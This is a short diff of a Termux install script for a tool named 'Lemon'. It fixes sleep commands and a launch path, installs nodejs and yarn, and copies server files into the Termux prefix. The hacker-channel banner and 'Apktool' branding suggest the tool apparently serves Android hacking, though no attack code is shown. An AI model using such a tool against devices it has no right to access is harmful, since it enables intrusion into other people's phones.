@@ -24,11 +24,11 @@ echo '
  echo ""
  echo ""
  echo -e "\e[1;31m  [\e[32m√\e[31m] \e[1;91m by \e[1;36mRaj Aryan \e[93m/ \e[100;92m Youtube.com/c/H4Ck3R0\e[0m"
- Sleep 9.0
+ sleep 6.0
  clear 
  echo -e "\e[34m[\e[92m✓\e[34m]\033[92m INSTALLING REQUIREED PACKAGES"
  apt install nodejs nano yarn -y
- Sleep 5.0
+ sleep 5.0
 
                  
                   toilet -F border -f mono12  "Apktool"  | lolcat
@@ -47,7 +47,7 @@ cd /data/data/com.termux/files/usr/share/
 mkdir lemon 
 cd $HOME/Lemon-termux/.files
 cp -r app assets clientData includes index.js package-lock.json package.json /data/data/com.termux/files/usr/share/lemon/
-sed -i 'ccd $PREFIX/share/lemon/server && node index.js' $HOME/Lemon-termux/lemon
+sed -i 'ccd $PREFIX/share/lemon/ && node index.js' $HOME/Lemon-termux/lemon
 cp -r $HOME/Lemon-termux/lemon /data/data/com.termux/files/usr/bin/
 chmod +x /data/data/com.termux/files/usr/bin/lemon
 
